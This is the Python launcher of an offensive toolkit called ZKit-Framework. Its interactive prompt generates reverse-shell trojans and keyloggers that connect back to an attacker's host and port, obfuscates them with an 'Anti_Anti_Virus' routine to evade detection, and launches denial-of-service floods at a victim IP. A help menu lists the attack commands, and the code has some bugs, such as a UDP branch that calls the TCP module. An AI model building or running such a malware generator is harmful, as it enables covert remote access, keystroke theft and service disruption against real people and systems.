'ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework'

__all__ = ["why_do_you_want_to_import_this"]


def why_do_you_want_to_import_this():
    'Why do you want to import this'
    return "Why_Do_You_Want_To_Import_This"


__author__ = 'Zer0'
# Created A New Header
__github__ = 'https://github.com/000Zer000/ZKit-Framework'
#
__version__ = 'WPR_0.9.1'
__license__ = 'Apache License 2.0'
__status__ = 'Developing'

if __name__ == "__main__" :
    try:
        from os import path
        from time import sleep as Sleep
        from colorama import init, Fore
        from ZKit_Banners import Banners
    except ImportError as value:
        import sys
        print("One Or Some On Requirments Not Found . Please Install Them And Try Again ."
              + "Python Threw  : " + str(value))
        sys.exit(1)

    # Initallizing Needed Variables
    PATH = path.dirname(__file__)
    T_PATH = PATH + "/Builded/Trojan/"
    D_PATH = PATH + "/Builded/Dos/"
    K_PATH = PATH + "/Builded/KeyLogger/"
    R_PATH = PATH + "/Builded/Ransomware/"
    init(convert=True)
    print(Fore.LIGHTGREEN_EX + Banners.Banner1 + Fore.RESET)

    Sleep(1)
    while True:

        CHOICES = str(input("ZKit > "))
        Choice = CHOICES.split()
        try:
            if Choice[0] == "trojan" and Choice[5] == "-h" and Choice[7] == "-p":
                from ZKit_Core import Main_Process
                file_name = T_PATH + Choice[4] + ".pyw"
                file_name = Main_Process.Create_File(PATH=file_name)
                strs = Main_Process.Anti_Anti_Virus(Count=4)
                str1, str2, str3, str4 = list(strs)
                if Choice[2] == 'tcp':
                    import ZKit_Core.Trojans.Reverse_Shell_TCP
                    ZKit_Core.Trojans.Reverse_Shell_TCP.Create(
                        Host=Choice[6], Port=Choice[8], str1=str1,
                        str2=str2, str3=str3, str4=str4, PATH=file_name
                    )
                elif Choice[2] == 'udp':
                    import ZKit_Core.Trojans.Reverse_Shell_UDP
                    ZKit_Core.Trojans.Reverse_Shell_UDP.Create(
                        Host=Choice[6], Port=Choice[8], str1=str1, str2=str2,
                        str3=str3, str4=str4, PATH=file_name)

            elif Choice[0] == 'dos' and (
                    Choice[1] == 'ss' and Choice[3] == '-s' and Choice[5] == '-v'):
                import ZKit_Core.Dos_Attackers.SS
                ZKit_Core.Dos_Attackers.SS.Run(
                    Source_IP=Choice[4], Victim_IP=Choice[6], Source_Port=Choice[6],
                    Victim_Port=Choice[7], Count=Choice[9], Message=Choice[8])
            elif Choice[0] == "keylogger" and Choice[5] == "-h" and Choice[7] == "-p":
                print('Attention : This Payload Is for Windows And Must Be Compiled .'
                      + 'It Can be easily compiled with pyinstaller')
                from ZKit_Core import Main_Process as ms
                file_name = K_PATH + Choice[4] + ".pyw"
                file_name = Main_Process.Create_File(PATH=file_name)
                strs = ms.Anti_Anti_Virus(Count=14)
                list(strs)
                if Choice[2] == 'tcp':
                    import ZKit_Core.KeyLoggers.TCP
                    ZKit_Core.KeyLoggers.TCP.Create(
                        Host=Choice[6], Port=Choice[8], a1=strs[0],
                        a2=strs[1], a3=strs[2], a4=strs[3], a5=strs[4],
                        a6=strs[5], a7=strs[6], a8=strs[7], a9=strs[8],
                        a10=strs[9], a11=strs[10], a12=strs[11],
                        a13=strs[12], a14=strs[13], PATH=file_name)
                elif Choice[2] == 'udp':
                    import ZKit_Core.KeyLoggers.UDP
                    ZKit_Core.KeyLoggers.TCP.Create(
                        Host=Choice[6], Port=Choice[8], a1=strs[0],
                        a2=strs[1], a3=strs[2], a4=strs[3], a5=strs[4],
                        a6=strs[5], a7=strs[6], a8=strs[7], a9=strs[8],
                        a10=strs[9], a11=strs[10], a12=strs[11],
                        a13=strs[12], a14=strs[13], PATH=file_name)
            elif CHOICES == 'help':
                print(''' *Case sensetive*
trojan -m UDP_OR_TCP -f FILENAME -h HOST_OR_IP -p PORT 
dos -m ss -s SOURCE_IP_OR_HOST SOURCE_PORT -v VICTIM_IP_OR_HOST VICTIM_PORT -m MESSAGE -c COUNT 
dos -m sm -s SOURCE_IP_OR_HOST SOURCE_PORT -v VICTIM_IP_OR_HOST VICTIM_PORTS -m MESSAGE -c COUNT 
keylogger -m UDP_OR_TCP -f FILENAME -h HOST_OR_IP -p PORT
                ''')
            else:
                print("{} Is Not A Valid Input\n".format(CHOICES))
        except IndexError:
            print('Invalid Input type help to see available commands')

